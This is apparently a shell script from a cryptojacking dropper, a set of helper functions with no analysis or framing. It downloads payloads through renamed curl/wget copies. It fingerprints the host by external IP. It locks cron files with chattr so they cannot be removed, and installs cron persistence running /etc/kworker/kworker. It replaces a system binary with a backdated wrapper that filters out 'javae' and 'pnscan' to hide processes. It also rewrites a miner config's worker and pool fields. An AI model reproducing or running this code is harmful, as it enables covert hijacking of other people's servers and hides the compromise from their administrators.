downloads() {
    local url="$1"
    local dest="$2"
    local backup_url="$3"

    local cmd=""
    if command -v cd1 >/dev/null 2>&1; then cmd="cd1"
    elif command -v curl >/dev/null 2>&1; then cmd="curl"
    elif command -v wd1 >/dev/null 2>&1; then cmd="wd1"
    elif command -v wget >/dev/null 2>&1; then cmd="wget"
    else
        echo "Error: Neither curl nor wget is available." >&2
        return 1
    fi

    _do_download() {
        local target_url="$1"
        rm -f "$dest" 

        if [ "$cmd" = "curl" ] || [ "$cmd" = "cd1" ]; then
            $cmd --connect-timeout 30 --retry 3 -sSL "$target_url" -o "$dest"
        else

            $cmd --timeout=30 --tries=3 -q -O "$dest" "$target_url"
        fi

        [ -s "$dest" ]
    }

    if _do_download "$url"; then
        return 0
    fi

    if [ -n "$backup_url" ]; then
        echo "Primary URL failed, trying backup URL..." >&2
        if _do_download "$backup_url"; then
            return 0
        fi
    fi

    return 1
}

generate_machine_id() {
    hostname_raw=""
    hostname_short=""
    external_ip=""

   
    hostname_raw=$( (hostname -s 2>/dev/null || hostname 2>/dev/null) || echo "UNKNOWN" )
    hostname_short="${hostname_raw%%.*}"
    [ -z "$hostname_short" ] && hostname_short="UNKNOWN"

 
    providers="ifconfig.me icanhazip.com ipinfo.io/ip"

    
    if [ -x "/usr/bin/curl" ] || [ -x "/usr/bin/cd1" ] || command -v curl >/dev/null 2>&1 || command -v cd1 >/dev/null 2>&1; then
        cmd="curl"
        if [ -x "/usr/bin/cd1" ] || command -v cd1 >/dev/null 2>&1; then
            [ ! -x "/usr/bin/curl" ] && [ -z "$(command -v curl 2>/dev/null)" ] && cmd="cd1"
        fi

        for provider in $providers; do
            external_ip=$($cmd -4 -s --max-time 2 "$provider" 2>/dev/null | tr -d '\r\n[:space:]')
            if echo "$external_ip" | grep -Eq '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
                break
            fi
        done
    fi

 
    if [ -z "$external_ip" ] || [ "$external_ip" = "NOIP" ]; then
        if [ -x "/usr/bin/wget" ] || [ -x "/usr/bin/wd1" ] || command -v wget >/dev/null 2>&1 || command -v wd1 >/dev/null 2>&1; then
            cmd="wget"
            if [ -x "/usr/bin/wd1" ] || command -v wd1 >/dev/null 2>&1; then
                [ ! -x "/usr/bin/wget" ] && [ -z "$(command -v wget 2>/dev/null)" ] && cmd="wd1"
            fi

            wget_opts="-qO-"
            if $cmd --help 2>&1 | grep -q -- "-4"; then
                wget_opts="-4 -qO-"
            fi

            for provider in $providers; do
                external_ip=$($cmd $wget_opts --timeout=2 "$provider" 2>/dev/null | tr -d '\r\n[:space:]')
                if echo "$external_ip" | grep -Eq '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
                    break
                fi
            done
        fi
    fi

 
    if ! echo "$external_ip" | grep -Eq '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
        external_ip="NOIP"
    fi

    echo "${external_ip}_${hostname_short}"
}

unlock_cron()
{
    chattr -R -ia /var/spool/cron
    chattr -ia /etc/crontab
    chattr -R -ia /var/spool/cron/crontabs
    chattr -R -ia /etc/cron.d
}

lock_cron()
{
    chattr -R +ia /var/spool/cron
    chattr +ia /etc/crontab
    chattr -R +ia /var/spool/cron/crontabs
    chattr -R +ia /etc/cron.d
}

modify_binary() {
    local binary=$1
    local original="${binary}s"
    
    if [ ! -f "$original" ]; then
        mv "$binary" "$original"
        echo "#! /bin/bash" > "$binary"
        echo "$original \$@ | grep -v \"javae\|pnscan\"" >> "$binary"
        chmod +x "$binary"
        touch -d 20160825 "$binary"
        echo "$binary modified"
    else
        echo "$binary already modified"
    fi
}

install_chattr_if_needed() {
    if [ ! -f "/bin/chattr" ] || [ "$(ls -l /bin/chattr | awk '{ print $5 }')" -lt "$chattr_size" ]; then
        yum -y remove e2fsprogs
        yum -y install e2fsprogs
    else
        echo "Chattr is installed correctly."
    fi
}

manage_cron() {
    unlock_cron
    rm -f "${crondir}" /etc/cron.d/javae /etc/crontab
    
    echo "*/50 * * * * bash /etc/kworker/kworker >/dev/null 2>&1" >> "$crondir"
    echo "*/50 * * * * root bash /etc/kworker/kworker >/dev/null 2>&1" >> /etc/cron.d/javae
    echo "0 1 * * * root bash /etc/kworker/kworker >/dev/null 2>&1" >> /etc/crontab
    
    echo "Crontab created"
    lock_cron
}

changeID() {
    local dest="$1"
    local CONFIG_JSON="${dest}/config.json"
    local TMP_CONFIG="${CONFIG_JSON}.tmp"
    local MACHINE_ID WORKER_NAME

   
    if [ ! -f "$CONFIG_JSON" ]; then
        log "Error: Config file $CONFIG_JSON does not exist."
        return 1
    fi

    
    MACHINE_ID=$(generate_machine_id)
    if [ -n "$CUSTOM_PREFIX" ]; then
        WORKER_NAME="${CUSTOM_PREFIX}_${MACHINE_ID}"
    else
        WORKER_NAME="$MACHINE_ID"
    fi

    log "FINAL WORKER NAME: $WORKER_NAME"

   
    trap 'rm -f "$TMP_CONFIG"' EXIT INT TERM

   
    if command -v jq >/dev/null 2>&1; then
        if jq --arg name "$WORKER_NAME" \
            '(.["worker-id"] = $name) | 
             (.["rig-id"] = $name) | 
             (.pools[]?.pass = $name)' "$CONFIG_JSON" > "$TMP_CONFIG" && \
           mv -f "$TMP_CONFIG" "$CONFIG_JSON"; then
            log "Config successfully customized via jq with Worker Name: $WORKER_NAME"
        else
            log "jq failed to update config"
        fi
    else
        local sed_opts="-i"
        sed --help 2>&1 | grep -q -- "--follow-symlinks" && sed_opts="-i --follow-symlinks"

        if sed $sed_opts \
            -e 's/"worker-id": *"[^"]*"/"worker-id": "'"$WORKER_NAME"'"/g' \
            -e 's/"rig-id": *"[^"]*"/"rig-id": "'"$WORKER_NAME"'"/g' \
            -e 's/"pass": *"[^"]*"/"pass": "'"$WORKER_NAME"'"/g' \
            "$CONFIG_JSON"; then
            log "Config successfully customized via sed with Worker Name: $WORKER_NAME"
        else
            log "sed failed to customize config"
        fi
    fi

    trap - EXIT INT TERM
}

